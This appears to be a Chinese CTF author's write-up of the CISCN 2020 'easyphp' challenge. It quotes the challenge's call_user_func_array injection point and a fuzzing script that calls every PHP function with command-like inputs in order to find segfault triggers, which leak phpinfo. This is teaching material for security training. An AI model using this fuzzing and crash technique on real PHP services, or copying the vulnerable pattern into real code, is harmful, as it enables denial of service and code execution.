categories:
- 杂
tags:
- web
- ctf
- 出题笔记
title: ciscn2020easyphp出题笔记
---
# easyphp出题笔记

这题原意是想让大家写脚本来fuzz来发现CUFA/CUF中对引用处理不恰当而造成的崩溃，特意禁止了pcntl可是由于没有认真测试，忘记了还有CUF这个函数，结果有人直接绕过了。

出题人想干的事情就是我们不让他干成就是对这种情况的最好解释。最后看到自己的题目被解成那样，我也是自闭了。

继续正题吧。

## 来由

之所以会出现这题是因为前段时间的wmctf的webweb反序列化出有这样一处的利用点，我为了找到合适的函数就采取fuzz，东西没发现倒是发现php崩溃了。



## 漏洞细节

直接去看[bugs.php](https://bugs.php.net/bug.php?id=79979) 上面的，会不会是因为交到bugs.php上的原因导致这么多人解了？



## 原解

阅读代码我们发现:`if(!pcntl_wifexited($status)){phpinfo();}`，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。

fork子进程执行的代码是：

```php
if(isset($_GET['a'])&&is_string($_GET['a'])&&!preg_match("/[:\\\\]|exec|pcntl/i",$_GET['a'])){
            call_user_func_array($_GET['a'],[$_GET['b'],false,true]);
```

而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：

```php
<?php

    $payloads=[
        "ls",//shell命令执行测试
        "index.php",//读取文件测试
        "asdfasldfjaklsdfjl.php",//创建文件/文件夹测试
        "echo 123;"//php命令执行测试
    ];
    $str=file_get_contents("fatalerr.log");
    if(!$str){
        $str="[]";
    }
    $fatalerror=eval("return ".$str.";");
    function show_result($func,$r,$v){
        if($r==NULL){
        }
        try{
            echo "$func($v,false,true) return value:";
            var_dump($r);
            echo "<br />";
        }catch(Exception $e){}
    }

    function brute_func($a){
        global $payloads;
        global $fatalerror;
        
        foreach($a as $val){
            
            if(is_array($val)){
                brute_func($val);
                continue;
            }
            
            if(in_array($val,$fatalerror)){
                continue;
            }
            array_push($fatalerror,$val);
            file_put_contents("fatalerr.log",var_export($fatalerror,TRUE));
            foreach($payloads as $v){
                $r=NULL;
                
                $r=call_user_func_array($val,[$v,false,true]);
                show_result($val,$r,$v);
                
            }
            array_pop($fatalerror);
            
        }
    };
    $arr=get_defined_functions();
    brute_func($arr);
?>
```



多次执行发现：

```php
stream_socket_server
exec
stream_socket_client
```

这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码，但是这里我禁用了exec所以我们用另外两个函数引起segment fault查看phpinfo，在phpinfo中找到flag。



## 最后

希望有师傅有不同的解可以留个言啥的谢谢啦